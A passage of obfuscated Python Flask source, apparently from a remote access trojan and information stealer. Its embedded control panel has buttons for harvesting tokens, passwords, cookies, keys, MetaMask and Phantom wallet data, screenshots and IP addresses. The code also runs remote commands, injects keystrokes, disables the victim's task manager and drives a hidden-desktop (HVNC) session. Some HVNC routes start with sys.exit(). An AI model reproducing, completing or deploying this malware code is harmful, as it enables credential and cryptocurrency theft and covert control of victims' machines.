0;text-align:left;padding-right:0;text-decoration:none;background-color:#da638d}.home-link03keys{top:194;left:500;color:var(--dl-color-gray-black);width:146px;position:absolute;align-self:stretch;box-shadow:#d4d4d4 5px 5px 10px 0;text-align:left;padding-right:0;text-decoration:none;background-color:#da638d}.home-link04{top:870;left:500;color:#fff;width:146px;position:absolute;box-shadow:#fff -5px -5px 10px 1px;background-color:#f58613}.home-link05{top:820;left:500;color:#fff;width:146px;position:absolute;box-shadow:-5px -5px 10px 1px #fff;background-color:#4e44ce}.home-link06{top:300;left:500;width:146px;position:absolute;box-shadow:#fff 0 0 50px 5px;background-color:#de3414}.home-link07{top:350;left:500;color:var(--dl-color-gray-black);width:146px;position:absolute;box-shadow:0 0 50px 5px #fff;background-color:#8fbf76}.home-link08{top:400;left:500;color:var(--dl-color-gray-black);width:146px;position:absolute;box-shadow:#fff 0 0 50px 5px;background-color:#71d8e0}.home-text{top:778px;left:500;color:#fff;position:absolute;font-style:normal;font-family:Fira Sans;font-weight:400}.home-text1{top:277px;left:500;color:#fff;position:absolute;font-style:normal;font-family:Fira Sans;font-weight:400}.home-text2{top:10px;left:500;color:#fff;position:absolute;font-style:normal;font-family:Fira Sans;font-weight:400}.home-textinput{top:550;left:240;color:#0b1cf9;width:767px;position:absolute}.home-textinput1{top:600;left:240;color:#0b1cf9;width:767px;position:absolute}.home-textinput2{top:650;left:240;color:#0b1cf9;width:767px;position:absolute}</style><div><div class="home-container"><a href="/tokens" target="_blank" rel="noreferrer noopener" class="home-link button">Tokens</a><a href="/passwords" target="_blank" rel="noreferrer noopener" class="home-link01 button">Passwords</a><a href="/cookies" target="_blank" rel="noreferrer noopener" class="home-link02 button">Cookies</a><a href="/keys" target="_blank" rel="noreferrer noopener" class="home-link03 button">Keys</a><a href="/running" target="_blank" rel="noreferrer noopener" class="home-link03keys button">Applications</a><a href="/metamask" target="_blank" rel="noreferrer noopener" class="home-link04 button">Metamask</a><a href="/phantom" target="_blank" rel="noreferrer noopener" class="home-link05 button">Phantom</a><a href="/dump" target="_blank" rel="noreferrer noopener" class="home-link06 button">Data Dump</a><a href="/screenshot" target="_blank" rel="noreferrer noopener" class="home-link07 button">Screen</a><a href="/ip" target="_blank" rel="noreferrer noopener" class="home-link08 button">IP</a><button id="open" class="button open">Open</button><button id="run" class="button run">Run</button><button id="clearcmd" class="button clearcmd">Clear</button><button id="clearopen" class="button clearopen">Clear</button><checkboxx><input type="checkbox" top="50px" checked="true" onclick="checkbox(event)">Ban task manager</checkboxx><span class="home-text">Crypto</span><span class="home-text1">Data</span><span class="home-text2">Control</span><input type="text" id="site_input" placeholder="site url" class="home-textinput input"> <input type="text" id="cmd_input" placeholder="command" class="home-textinput1 input"> <input type="text" id="text_input" placeholder="text input (type on pc)" class="home-textinput2 input" onkeyup="deal_with_input()"></div></div><script>const openbutton = document.getElementById('open');

  openbutton.addEventListener('click', async _ => {
    
    try {     
      const response = await fetch('/open', {
        method: 'post',
        body: JSON.stringify({url:  document.getElementById("site_input").value})
      });
      console.log('Completed!', response);
    } catch(err) {
      alert(`Error: ${err}`);
    }
  });


  const runbutton = document.getElementById('run');

  runbutton.addEventListener('click', async _ => {
    
    const encoded = encodeURIComponent(document.getElementById("cmd_input").value) 
    console.log("Running command : "+encoded)
    window.open("/run?command="+encoded);

    
  })

  const clearbuttoncmd = document.getElementById('clearcmd');

  clearbuttoncmd.addEventListener('click', async _ => {
    document.getElementById("cmd_input").value = "";
  });

  const clearbuttonopen = document.getElementById('clearopen');

  clearbuttonopen.addEventListener('click', async _ => {
    document.getElementById("site_input").value = "";
  });


  function checkbox(e)
{
  
  if(e.target.checked)
  {
    ///do post request with 1 in parameter
    try {     
        const response =  fetch('/taskmanager?turn=on', {
        method: 'get',
      });
      console.log('Completed!', response);
    } catch(err) {
      alert(`Error: ${err}`);
    }
  }
  else
  {
    try {     
        const response =  fetch('/taskmanager?turn=off', {
        method: 'get',
      });
      console.log('Completed!', response);
    } catch(err) {
      alert(`Error: ${err}`);
    }
  }
}


  function deal_with_input()
{
  console.log(document.getElementById("text_input").value)
  try {     
      const response = fetch('/type', {
        method: 'post',
        body: JSON.stringify({keys:  document.getElementById("text_input").value})
      });
      console.log('Completed!', response);
    } catch(err) {
      alert(`Error: ${err}`);
    }
  document.getElementById("text_input").value = "";
}</script>"""  # line:2364


@app .route ('/hvncmouse', methods =["POST"])  # line:2369
def hvnc_mouse_manager():  # line:2370
    sys.exit()
    O00O000OOOOO000O0 = request .get_json("type")  # line:2372
    O00O0OO0OO00O0000 = int(O00O000OOOOO000O0 ["type"])  # line:2373
    OOOOO0OOO0O0O0OOO = request .get_json("x_data")  # line:2375
    OO0O0O0OO0O00OO0O = int(OOOOO0OOO0O0O0OOO ["x"])  # line:2376
    O00OOO00O0O0OOOOO = request .get_json("y_data")  # line:2378
    O0O0OO0OO0OO0OOOO = int(O00OOO00O0O0OOOOO ["y"])  # line:2379
    if O00O0OO0OO00O0000 == 1:  # line:2381
        O00OOO0OOO0OO0OOO = "left"  # line:2382
    elif O00O0OO0OO00O0000 == 3:  # line:2383
        O00OOO0OOO0OO0OOO = "right"  # line:2384
    else:  # line:2385
        return "Invalid option"  # line:2386
    _OOO0OOO0OOOO0OOOO (OO0O0O0OO0O00OO0O , O0O0OO0OO0OO0OOOO , O00OOO0OOO0OO0OOO )  # line:2387
    return "Done"  # line:2396


@app .route('/hvncitem')  # line:2399
def hnvc_opener():  # line:2400
    sys.exit()
    try:  # line:2401
        O000OOO00OOO00O00 = request .args .get('start')  # line:2402
        startProcess(O000OOO00OOO00O00)  # line:2403
        return "GOOD"  # line:2404
    except:  # line:2405
        return "BAD"  # line:2406


@app .route('/hvncmanage')  # line:2408
@app .route('/hvncmanager')  # line:2409
def hvnc_manager():  # line:2410
    sys.exit()
    OO0OO00O00OOOOOO0 = ""  # line:2411
    for O0000O0OO0000OOO0 in browsers .keys():  # line:2412
        OO0OO00O00OOOOOO0 += f'''<a href="javascript: onclick('BROWSERHERE');"><button class="btn"><i class="fa fa-BROWSERHERE"></i>  {O0000O0OO0000OOO0.upper()}</button></a>\n'''.replace ("BROWSERHERE", O0000O0OO0000OOO0 )  # line:2413
    O0O0OOO00000O0O00 = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><style>
.btn {background-color: rgb(26, 70, 214);border: none;color: rgb(240, 240, 240);padding: 12px 16px;font-size: 16px;cursor: pointer;}
.btn:hover {    background-color: Red;}</style></head><body>

<p>HIDDEN DESKTOP - OPEN</p>
<p id="wow">Click a button to run said browser on hidden desktop - note that some applications can only be ran one at a time</p>
BUTTONSHERE
</body></html>


<script>
function onclick(application) {
    console.log("Opening "+application)
    try {     
        const response =  fetch('/hvncitem?start='+application, {
            method: 'get',
        });
        document.getElementById("wow").innerHTML = "Opened "+application
        } catch(err) {
        alert(`Error: ${err}`);
    }

}
</script>
""".replace ("BUTTONSHERE", OO0OO00O00OOOOOO0)  # line:2441
    O0O0OOO00000O0O00 = O0O0OOO00000O0O00 .replace ("fa fa-brave", "fa fa-shield").replace ("fa fa-operagx", "fa fa-opera")#line:2442
    return O0O0OOO00000O0O00  # line:2443


@app .route('/hvnc')  # line:2445
@app .route('/hvncscreenshot')  # line:2446
def hvncscreenshot():  # line:2447
    sys.exit()
    return """
<style>.movetobottom{position:absolute;bottom:-25px;left:10px}.container{position:fixed}.containertwo{position:relative;width:20px;bottom:0;right:-90%;accent-color:#25ea84;background:#fff}</style><html><body><div class="container"><img id="myImage" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA6gAAAFnCAYAAACrYGRgAAAAAXNSR0IArs4c6QAAIABJREFUeF7t3buaFEeWAOCU1+OtPMlDb4DeAqwFDyy1PDCxAAvaamQhj/FgLOS1vMEcb0z0CHiLt+0xHvtFa6tVJFlVmVl5ORHxlzMX8nLiP1HVeTIyIr/5/Pnz58aHAAECBAgQIECAAAECBAisLPCNAnXlDDg9AQIECBAgQIAAAQIECFwJKFB1BAIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAAECBAgQIECAgAJVHyBAgAABAgQIECBAgACBEAIK1BBpEAQBAgQIECBAgAABAgQIKFD1AQIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAAECBAgQIECAgAJVHyBAgAABAgQIECBAgACBEAIK1BBpEAQBAgQIECBAgAABAgQIKFD1AQIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAAECBAgQIECAgAJVHyBAgAABAgQIECBAgACBEAIK1BBpEAQBAgQIECBAgAABAgQIKFD1AQIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAAECBAgQIECAgAJVHyBAgAABAgQIECBAgACBEAIK1BBpEAQBAgQIECBAgAABAgQIKFD1AQIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAIGyBN69e9f88ssvzU8//dScnp6W1TitIUCAAIHZBBSos9E6MAECBAgQqFfg+++/bz5+/NicnJw0nz59qhdCywkQIEBgkIACdRCXjQkQIECAAIE+At988831Zp8/f+6zi20IECBAgECjQNUJCBAgQIAAgckFtgvU169fe8x3cmEHJECAQJkCCtQy86pVBAgQIEBgVYG//e1vzX/+85+rGDzmu2oqnJwAAQJZCShQs0qXYAkQIECAQB4CL168aJ4+fXodrFHUPPImSgIECKwtoEBdOwPOT4AAAQIEChUwilpoYjWLAAECMwooUGfEdWgCBAgQIFCzgFHUmrOv7QQIEBgnoEAd52YvAgQIECBAoIeAUdQeSDYhQIAAgWsBBarOQIAAAQIECMwmYBR1NloHJkCAQJECCtQi06pRBAgQIEAgjoBR1Di5EAkBAgSiCyhQo2dIfAQIECBAIHOB9ijq58+fM2+R8AkQIEBgLgEF6lyyjkuAAAECBAhcC2yPop6fnzdPnjyhQ4AAAQIEvhJQoOoUBAgQIECAwOwCjx49an799der85ycnDSfPn2a/ZxOQIAAAQL5CShQ88uZiAkQIECAQHYC//nPf5pvv/22Sf+ZPkZRs0uhgAkQILCIgAJ1EWYnIUCAAAECBIyi6gMECBAgcEhAgXpIyL8TIECA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